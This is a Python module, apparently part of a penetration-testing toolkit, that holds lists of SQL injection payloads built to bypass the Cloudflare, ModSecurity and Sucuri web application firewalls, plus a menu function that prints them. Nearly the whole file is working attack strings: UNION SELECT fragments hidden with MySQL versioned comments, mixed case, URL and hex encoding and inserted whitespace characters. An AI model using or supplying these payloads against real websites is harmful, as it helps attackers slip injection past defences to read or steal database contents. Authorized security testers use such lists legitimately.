from colorama import Fore, Style

# WAF bypass payloads for different WAFs
WAF_BYPASS_PAYLOADS = {
    'Cloudflare': [
        "/*!50000UnIoN*/",
        "/*!50000SeLeCt*/",
        "/*!50000union*//*!50000select*/",
        "+'union'+select+'1',+'2'--+-",
        "%23%0Aunion%23%0Aselect%23%0A1,2--+-",
        "/*!12345UNION SELECT*/",
        "+/*!12345UnIoN*/+/*!12345sElEcT*/+",
        "/*!13337UNION*//*!13337SELECT*/",
        "/*!13337UnIoN*//*!13337SeLeCt*/",
        "/*!12345UniON*/SeLeCT/**/"
    ],
    'ModSecurity': [
        "/*!12345UNION SELECT*/",
        "/*!50000UNION*//*!50000SELECT*/",
        "/*!12345UNION*//*!12345SELECT*/",
        "+UnIoN/*&a=*/SeLeCT/*&a=*/",
        "%0AunION%0AsEleCt",
        "/**//*!12345UNION SELECT*//**/",
        "/**//*!50000UNION SELECT*//**/",
        "/**/UNION/**/SELECT/**/",
        "/**//*!12345UNION*//**//*!12345SELECT*//**/",
        "/*!50000UniON*//*!50000SeLeCt*//**/"
    ],
    'Sucuri': [
        "/*!50000%75%6e%69%6f%6e*/ /*!50000%73%65%6c%65%63%74*/",
        "%75%6e%69%6f%6e %73%65%6c%65%63%74",
        "un?on sel?ct",
        "/*!12345UnIoN*//*!12345sElEcT*/",
        "/**//*!12345UNION SELECT*//**/",
        "/*!50000%55%4e%49%4f%4e*/ /*!50000%53%45%4c%45%43%54*/",
        "/*!u%6eion*/ /*!se%6cect*/",
        "uni%0bon+se%0blect",
        "%2f**%2f/*!12345UNION SELECT*/%2f**%2f",
        "/*!12345UnIoN*//*!12345SeLeCt*//**/"
    ]
}

def list_waf_payloads():
    """Display WAF bypass payloads"""
    print(Fore.CYAN + "\n=== WAF Bypass Payloads ===\n")
    
    # Get WAF type from user
    print(Fore.GREEN + "Available WAFs:")
    for i, waf in enumerate(WAF_BYPASS_PAYLOADS.keys(), 1):
        print(Fore.GREEN + f"{i}. {waf}")
    
    choice = input(Fore.GREEN + "\nSelect WAF number (or press Enter for all): " + Style.RESET_ALL)
    
    try:
        if choice.strip():
            waf_index = int(choice) - 1
            waf_names = list(WAF_BYPASS_PAYLOADS.keys())
            if 0 <= waf_index < len(waf_names):
                waf_name = waf_names[waf_index]
                print(Fore.YELLOW + f"\nPayloads for {waf_name}:")
                for payload in WAF_BYPASS_PAYLOADS[waf_name]:
                    print(Fore.WHITE + f"- {payload}")
            else:
                print(Fore.RED + "\nInvalid WAF selection")
        else:
            # Show all payloads
            for waf_name, payloads in WAF_BYPASS_PAYLOADS.items():
                print(Fore.YELLOW + f"\nPayloads for {waf_name}:")
                for payload in payloads:
                    print(Fore.WHITE + f"- {payload}")
                    
    except ValueError:
        print(Fore.RED + "\nInvalid input. Please enter a number.")
    except Exception as e:
        print(Fore.RED + f"\nError: {str(e)}") 